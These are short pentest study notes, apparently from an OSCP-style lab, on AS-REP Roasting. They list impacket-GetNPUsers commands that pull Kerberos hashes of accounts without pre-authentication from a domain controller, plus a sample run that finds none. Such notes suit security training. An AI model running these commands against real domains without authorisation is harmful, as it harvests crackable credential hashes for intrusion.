

AS-REP Roasting
```
impacket-GetNPUsers -dc-ip 172.16.236.10 -request -outputfile hashes.asreproast medtech.com/joe
```

Example

```
┌──(kali㉿kali)-[~/Medtech-Challenge1]
└─$ impacket-GetNPUsers -dc-ip 172.16.236.10 -request -outputfile hashes.asreproast medtech.com/joe
Impacket v0.12.0.dev1+20230909.154612.3beeda7 - Copyright 2023 Fortra

Password:
No entries found!
```

AS-REP Roasting: Looking for users that have UF_DONT_REQUIRE_PREAUTH set
```
impacket-GetNPUsers oscp.exam/ -dc-ip 172.16.236.10 -request -no-pass -outputfile hashes.asreproast -usersfile valid_users.txt
```